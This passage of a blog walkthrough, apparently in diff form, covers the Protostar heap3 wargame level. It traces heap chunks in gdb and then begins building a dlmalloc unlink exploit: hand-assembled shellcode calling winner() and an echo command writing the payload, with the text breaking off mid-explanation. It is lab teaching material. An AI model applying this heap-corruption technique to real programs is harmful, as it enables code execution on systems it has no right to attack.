+</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">c</span>
+</span><span class='line'><span class="n">Continuing</span><span class="p">.</span>
+</span><span class='line'><span class="mh">0x804c000</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000029</span>  <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>
+</span><span class='line'><span class="mh">0x804c010</span><span class="o">:</span> <span class="mh">0x41414141</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
+</span><span class='line'><span class="mh">0x804c020</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000029</span>
+</span><span class='line'><span class="mh">0x804c030</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
+</span><span class='line'><span class="mh">0x804c040</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
+</span><span class='line'><span class="mh">0x804c050</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000029</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
+</span><span class='line'><span class="mh">0x804c060</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
+</span><span class='line'><span class="mh">0x804c070</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000f89</span>
+</span><span class='line'><span class="mh">0x804c080</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
+</span><span class='line'><span class="mh">0x804c090</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
+</span><span class='line'><span class="mh">0x804c0a0</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
+</span><span class='line'><span class="mh">0x804c0b0</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
+</span><span class='line'><span class="mh">0x804c0c0</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
+</span><span class='line'><span class="mh">0x804c0d0</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
+</span><span class='line'>
+</span><span class='line'><span class="n">Breakpoint</span> <span class="mi">2</span><span class="p">,</span> <span class="mh">0x08048750</span> <span class="n">in</span> <span class="n">strcpy</span><span class="err">@</span><span class="n">plt</span> <span class="p">()</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>We see the the 12 <code>A</code>&rsquo;s (ASCII value 41) have been written to the heap. Continue two more times past
+the remaining two <code>strcpy()</code>&rsquo;s.</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">c</span>
+</span><span class='line'><span class="n">Continuing</span><span class="p">.</span>
+</span><span class='line'><span class="mh">0x804c000</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000029</span>  <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>
+</span><span class='line'><span class="mh">0x804c010</span><span class="o">:</span> <span class="mh">0x41414141</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
+</span><span class='line'><span class="mh">0x804c020</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000029</span>
+</span><span class='line'><span class="mh">0x804c030</span><span class="o">:</span> <span class="mh">0x42424242</span>  <span class="mh">0x42424242</span>  <span class="mh">0x42424242</span>  <span class="mh">0x00000000</span>
+</span><span class='line'><span class="mh">0x804c040</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
+</span><span class='line'><span class="mh">0x804c050</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000029</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
+</span><span class='line'><span class="mh">0x804c060</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
+</span><span class='line'><span class="mh">0x804c070</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000f89</span>
+</span><span class='line'><span class="mh">0x804c080</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
+</span><span class='line'><span class="mh">0x804c090</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
+</span><span class='line'><span class="mh">0x804c0a0</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
+</span><span class='line'><span class="mh">0x804c0b0</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
+</span><span class='line'><span class="mh">0x804c0c0</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
+</span><span class='line'><span class="mh">0x804c0d0</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
+</span><span class='line'>
+</span><span class='line'><span class="n">Breakpoint</span> <span class="mi">2</span><span class="p">,</span> <span class="mh">0x08048750</span> <span class="n">in</span> <span class="n">strcpy</span><span class="err">@</span><span class="n">plt</span> <span class="p">()</span>
+</span><span class='line'><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">c</span>
+</span><span class='line'><span class="n">Continuing</span><span class="p">.</span>
+</span><span class='line'><span class="mh">0x804c000</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000029</span>  <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>
+</span><span class='line'><span class="mh">0x804c010</span><span class="o">:</span> <span class="mh">0x41414141</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
+</span><span class='line'><span class="mh">0x804c020</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000029</span>
+</span><span class='line'><span class="mh">0x804c030</span><span class="o">:</span> <span class="mh">0x42424242</span>  <span class="mh">0x42424242</span>  <span class="mh">0x42424242</span>  <span class="mh">0x00000000</span>
+</span><span class='line'><span class="mh">0x804c040</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
+</span><span class='line'><span class="mh">0x804c050</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000029</span>  <span class="mh">0x43434343</span>  <span class="mh">0x43434343</span>
+</span><span class='line'><span class="mh">0x804c060</span><span class="o">:</span> <span class="mh">0x43434343</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
+</span><span class='line'><span class="mh">0x804c070</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000f89</span>
+</span><span class='line'><span class="mh">0x804c080</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
+</span><span class='line'><span class="mh">0x804c090</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
+</span><span class='line'><span class="mh">0x804c0a0</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
+</span><span class='line'><span class="mh">0x804c0b0</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
+</span><span class='line'><span class="mh">0x804c0c0</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
+</span><span class='line'><span class="mh">0x804c0d0</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
+</span><span class='line'>
+</span><span class='line'><span class="n">Breakpoint</span> <span class="mi">3</span><span class="p">,</span> <span class="n">free</span> <span class="p">(</span><span class="n">mem</span><span class="o">=</span><span class="mh">0x804c058</span><span class="p">)</span> <span class="n">at</span> <span class="n">common</span><span class="o">/</span><span class="n">malloc</span><span class="p">.</span><span class="nl">c</span><span class="p">:</span><span class="mi">3583</span>
+</span><span class='line'><span class="mi">3583</span>  <span class="n">in</span> <span class="n">common</span><span class="o">/</span><span class="n">malloc</span><span class="p">.</span><span class="n">c</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>We see the 12 <code>B</code>&rsquo;s and <code>C</code>&rsquo;s being written to their respective chunks. We are now at the first
+<code>free()</code>. Continue again.</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">c</span>
+</span><span class='line'><span class="n">Continuing</span><span class="p">.</span>
+</span><span class='line'><span class="mh">0x804c000</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000029</span>  <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>
+</span><span class='line'><span class="mh">0x804c010</span><span class="o">:</span> <span class="mh">0x41414141</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
+</span><span class='line'><span class="mh">0x804c020</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000029</span>
+</span><span class='line'><span class="mh">0x804c030</span><span class="o">:</span> <span class="mh">0x42424242</span>  <span class="mh">0x42424242</span>  <span class="mh">0x42424242</span>  <span class="mh">0x00000000</span>
+</span><span class='line'><span class="mh">0x804c040</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
+</span><span class='line'><span class="mh">0x804c050</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000029</span>  <span class="mh">0x00000000</span>  <span class="mh">0x43434343</span>
+</span><span class='line'><span class="mh">0x804c060</span><span class="o">:</span> <span class="mh">0x43434343</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
+</span><span class='line'><span class="mh">0x804c070</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000f89</span>
+</span><span class='line'><span class="mh">0x804c080</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
+</span><span class='line'><span class="mh">0x804c090</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
+</span><span class='line'><span class="mh">0x804c0a0</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
+</span><span class='line'><span class="mh">0x804c0b0</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
+</span><span class='line'><span class="mh">0x804c0c0</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
+</span><span class='line'><span class="mh">0x804c0d0</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
+</span><span class='line'>
+</span><span class='line'><span class="n">Breakpoint</span> <span class="mi">3</span><span class="p">,</span> <span class="n">free</span> <span class="p">(</span><span class="n">mem</span><span class="o">=</span><span class="mh">0x804c030</span><span class="p">)</span> <span class="n">at</span> <span class="n">common</span><span class="o">/</span><span class="n">malloc</span><span class="p">.</span><span class="nl">c</span><span class="p">:</span><span class="mi">3583</span>
+</span><span class='line'><span class="mi">3583</span>  <span class="n">in</span> <span class="n">common</span><span class="o">/</span><span class="n">malloc</span><span class="p">.</span><span class="n">c</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>The first word of the third chunk&rsquo;s data at <code>0x804c058</code> has been zeroed out. Continue.</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">c</span>
+</span><span class='line'><span class="n">Continuing</span><span class="p">.</span>
+</span><span class='line'><span class="mh">0x804c000</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000029</span>  <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>
+</span><span class='line'><span class="mh">0x804c010</span><span class="o">:</span> <span class="mh">0x41414141</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
+</span><span class='line'><span class="mh">0x804c020</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000029</span>
+</span><span class='line'><span class="mh">0x804c030</span><span class="o">:</span> <span class="mh">0x0804c050</span>  <span class="mh">0x42424242</span>  <span class="mh">0x42424242</span>  <span class="mh">0x00000000</span>
+</span><span class='line'><span class="mh">0x804c040</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
+</span><span class='line'><span class="mh">0x804c050</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000029</span>  <span class="mh">0x00000000</span>  <span class="mh">0x43434343</span>
+</span><span class='line'><span class="mh">0x804c060</span><span class="o">:</span> <span class="mh">0x43434343</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
+</span><span class='line'><span class="mh">0x804c070</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000f89</span>
+</span><span class='line'><span class="mh">0x804c080</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
+</span><span class='line'><span class="mh">0x804c090</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
+</span><span class='line'><span class="mh">0x804c0a0</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
+</span><span class='line'><span class="mh">0x804c0b0</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
+</span><span class='line'><span class="mh">0x804c0c0</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
+</span><span class='line'><span class="mh">0x804c0d0</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
+</span><span class='line'>
+</span><span class='line'><span class="n">Breakpoint</span> <span class="mi">3</span><span class="p">,</span> <span class="n">free</span> <span class="p">(</span><span class="n">mem</span><span class="o">=</span><span class="mh">0x804c008</span><span class="p">)</span> <span class="n">at</span> <span class="n">common</span><span class="o">/</span><span class="n">malloc</span><span class="p">.</span><span class="nl">c</span><span class="p">:</span><span class="mi">3583</span>
+</span><span class='line'><span class="mi">3583</span>  <span class="n">in</span> <span class="n">common</span><span class="o">/</span><span class="n">malloc</span><span class="p">.</span><span class="n">c</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p><code>0x804c030</code> now has <code>0x0804c050</code> which is a pointer to the start of the third chunk. This shows the
+second and third chunk are now tied together in a singly-linked list since they are small enough to
+be considered fastbins. Continue.</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">c</span>
+</span><span class='line'><span class="n">Continuing</span><span class="p">.</span>
+</span><span class='line'><span class="mh">0x804c000</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000029</span>  <span class="mh">0x0804c028</span>  <span class="mh">0x41414141</span>
+</span><span class='line'><span class="mh">0x804c010</span><span class="o">:</span> <span class="mh">0x41414141</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
+</span><span class='line'><span class="mh">0x804c020</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000029</span>
+</span><span class='line'><span class="mh">0x804c030</span><span class="o">:</span> <span class="mh">0x0804c050</span>  <span class="mh">0x42424242</span>  <span class="mh">0x42424242</span>  <span class="mh">0x00000000</span>
+</span><span class='line'><span class="mh">0x804c040</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
+</span><span class='line'><span class="mh">0x804c050</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000029</span>  <span class="mh">0x00000000</span>  <span class="mh">0x43434343</span>
+</span><span class='line'><span class="mh">0x804c060</span><span class="o">:</span> <span class="mh">0x43434343</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
+</span><span class='line'><span class="mh">0x804c070</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000f89</span>
+</span><span class='line'><span class="mh">0x804c080</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
+</span><span class='line'><span class="mh">0x804c090</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
+</span><span class='line'><span class="mh">0x804c0a0</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
+</span><span class='line'><span class="mh">0x804c0b0</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
+</span><span class='line'><span class="mh">0x804c0c0</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
+</span><span class='line'><span class="mh">0x804c0d0</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
+</span><span class='line'>
+</span><span class='line'><span class="n">Breakpoint</span> <span class="mi">4</span><span class="p">,</span> <span class="mh">0x08048790</span> <span class="n">in</span> <span class="n">puts</span><span class="err">@</span><span class="n">plt</span> <span class="p">()</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Now the first chunk has been freed and address <code>0x804c008</code> has a pointer <code>0x0804c028</code> to the second
+chunk. If we continue, the program runs the <code>printf("dynamite failed?\n");</code> line.</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">c</span>
+</span><span class='line'><span class="n">Continuing</span><span class="p">.</span>
+</span><span class='line'><span class="n">dynamite</span> <span class="n">failed</span><span class="o">?</span>
+</span><span class='line'>
+</span><span class='line'><span class="n">Program</span> <span class="n">exited</span> <span class="n">with</span> <span class="n">code</span> <span class="mf">021.</span>
+</span><span class='line'><span class="mh">0x804c000</span><span class="o">:</span> <span class="n">Error</span> <span class="k">while</span> <span class="n">running</span> <span class="nl">hook_stop</span><span class="p">:</span>
+</span><span class='line'><span class="n">Cannot</span> <span class="n">access</span> <span class="n">memory</span> <span class="n">at</span> <span class="n">address</span> <span class="mh">0x804c000</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<h2>Crafting the exploit</h2>
+
+<p>Let&rsquo;s work backwards. We can use <code>unlink()</code> to write the four byte address of a call to <code>winner()</code> to the GOT
+entry for <code>puts()</code>. Use <code>objdump</code> to find the address of <code>winner()</code>.</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="n">user</span><span class="err">@</span><span class="nl">protostar</span><span class="p">:</span><span class="err">$</span> <span class="n">objdump</span> <span class="o">-</span><span class="n">t</span> <span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">protostar</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">heap3</span> <span class="o">|</span> <span class="n">grep</span> <span class="n">winner</span>
+</span><span class='line'><span class="mi">08048864</span> <span class="n">g</span>     <span class="n">F</span> <span class="p">.</span><span class="n">text</span>    <span class="mo">00000025</span>              <span class="n">winner</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>We can&rsquo;t just put <code>0x08048864</code> in the GOT entry at <code>0x804b128</code> (why?).
+In order to call <code>winner()</code>, we&rsquo;ll need to craft a payload that does so. Such a
+payload is often called &ldquo;<a href="https://en.wikipedia.org/wiki/Shellcode">shellcode</a>.&rdquo; The following assembly code will do.</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="n">mov</span> <span class="n">eax</span><span class="p">,</span> <span class="mh">0x8048864</span>
+</span><span class='line'><span class="n">call</span> <span class="n">eax</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Using an <a href="https://defuse.ca/online-x86-assembler.htm#disassembly">online x86 assembler</a>, the above in raw assembly is
+<code>\xB8\x64\x88\x04\x08\xFF\xD0</code>. We can store this in the heap&rsquo;s first chunk whose data area starts
+at <code>0x804c008</code>. Now we want to write <code>0x804c008</code> into the GOT entry for <code>puts()</code> at <code>0x804b128</code>.
+Let&rsquo;s go back to the unlink statements.</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="n">BK</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="n">P</span> <span class="o">+</span> <span class="mi">12</span><span class="p">);</span>
+</span><span class='line'><span class="n">FD</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="n">P</span> <span class="o">+</span> <span class="mi">8</span><span class="p">);</span>
+</span><span class='line'><span class="o">*</span><span class="p">(</span><span class="n">FD</span> <span class="o">+</span> <span class="mi">12</span><span class="p">)</span> <span class="o">=</span> <span class="n">BK</span><span class="p">;</span>
+</span><span class='line'><span class="o">*</span><span class="p">(</span><span class="n">BK</span> <span class="o">+</span> <span class="mi">8</span><span class="p">)</span> <span class="o">=</span> <span class="n">FD</span><span class="p">;</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p><code>BK</code> is the address of <code>\xB8\x64\x88\x04\x08\xFF\xD0</code>. Where should we store that? Let&rsquo;s put it in
+the first chunk at <code>0x804c014</code>. The first chunk&rsquo;s data starts at <code>0x804c008</code>, but we&rsquo;ve seen the
+first byte is changed by dlmalloc when it&rsquo;s freed. We don&rsquo;t want our shellcode to be changed so we
+put it at a safe distance in the data at a +12-byte offset. 12 <code>A</code>&rsquo;s can pad the shellcode enough to
+push it 12-bytes into the heap. We have enough info to construct the first command line argument.</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="n">user</span><span class="err">@</span><span class="nl">protostar</span><span class="p">:</span><span class="err">$</span> <span class="n">echo</span> <span class="o">-</span><span class="n">en</span> <span class="s">&quot;AAAAAAAAAAAA</span><span class="se">\xB8\x64\x88\x04\x08\xFF\xD0</span><span class="s">&quot;</span> <span class="o">&gt;</span> <span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">A</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>We&rsquo;ll store <code>FD</code> and <code>BK</code> in the third chunk. We can use the second command line argument to
